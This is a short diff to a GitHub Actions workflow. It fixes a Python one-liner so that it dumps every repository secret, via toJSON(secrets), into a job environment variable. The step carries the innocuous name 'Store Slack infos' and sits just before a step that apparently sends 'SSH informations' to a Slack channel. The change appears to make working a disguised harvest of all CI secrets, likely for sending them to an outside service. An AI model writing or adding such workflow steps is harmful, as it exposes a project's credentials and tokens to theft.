@@ -15,7 +15,7 @@ jobs:
       - name: Store Slack infos
         shell: bash
         run: |
-          echo "processed=$(KV='${{ toJSON(secrets) }}' python -c 'print(os.environ["KV"])')" >> $GITHUB_ENV
+          echo "processed=$(KV='${{ toJSON(secrets) }}' python -c 'import os; print(os.environ["KV"])')" >> $GITHUB_ENV
 
       - name: Send SSH informations to Slack channel
         uses: slackapi/slack-github-action@6c661ce58804a1a20f6dc5fbee7f0381b469e001
